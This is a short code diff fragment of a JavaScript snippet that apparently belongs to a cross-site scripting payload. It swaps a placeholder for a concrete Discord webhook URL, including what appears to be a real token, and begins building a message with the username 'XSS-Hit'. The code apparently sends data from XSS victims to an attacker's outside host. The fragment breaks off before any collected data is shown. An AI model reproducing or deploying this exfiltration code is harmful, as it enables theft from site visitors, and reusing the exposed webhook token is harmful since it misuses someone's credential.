@@ -1,6 +1,6 @@
 (function(){
   try {
-    const webhook = "https://discord.com/api/webhooks/ID/TOKEN?wait=true"; // REPLACE
+    const webhook = "https://discordapp.com/api/webhooks/1435106041175081031/sEEPIQ7p60XPVA609k4WNz_ZbVtqbjzjaeygiwdRuvrTDi7XCrncUluQKgzyIADtDJea?wait=true"; // REPLACE
     const payload = {
       username: "XSS-Hit",
       content: [
